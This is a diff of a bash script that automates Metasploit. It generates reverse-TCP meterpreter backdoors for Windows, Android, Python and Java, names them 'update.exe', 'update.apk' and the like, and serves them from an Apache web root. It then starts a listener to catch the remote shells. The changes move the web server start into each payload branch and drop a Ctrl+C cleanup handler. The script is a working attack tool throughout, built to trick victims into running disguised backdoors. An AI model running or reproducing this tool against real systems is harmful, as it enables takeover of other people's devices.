@@ -36,7 +36,7 @@ If you do not want to use the program, please press Ctrl+C to exit.
 '
 
 service postgresql start
-systemctl start apache2.service
+#systemctl start apache2.service
 
 exe='1'
 apk='2'
@@ -44,56 +44,42 @@ py='3'
 jar='4' 
 cl='5'
 
-# cleanup function with Ctrl+C
-cleanup()
-{
-#Edit if you want!
-systemctl stop apache2.service
-#Clean
-   echo -e "\e[00;37m[!]\e[00m Clear everything GoodBye =)"
-      return $?
-}
-# run if user hits control-c
-   control_c()
-{
-   cleanup
-      exit $?
-}
-# trap keyboard interrupt (control-c)
-trap control_c SIGINT
-#####################################################
-
 read x
 
 # 1
 if [ "$x" == "$exe" ]; then                    
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -b "\x00" -f exe > /root/Desktop/update.exe
 	mv /root/Desktop/update.exe /var/www/html
+	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 # 2
 elif [ "$x" == "$apk" ]; then                          
 msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.apk
 	mv /root/Desktop/update.apk /var/www/html
+	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 # 3
 elif [ "$x" == "$py" ]; then                       
 msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.py
 	mv /root/Desktop/update.py /var/www/html
+	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 # 4
 elif [ "$x" == "$jar" ]; then                        
 msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/update.jar
 	mv /root/Desktop/update.jar /var/www/html
+	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
 # 5	
 elif [ "$x" == "$cl" ]; then
 	echo "Wait to clean..."
-		sleep 3;	
+		sleep 3;
+		systemctl stop apache2.service	
 		rm -rf /var/www/html/*
 		echo "Erverything is cleaning ;)"
 	fi
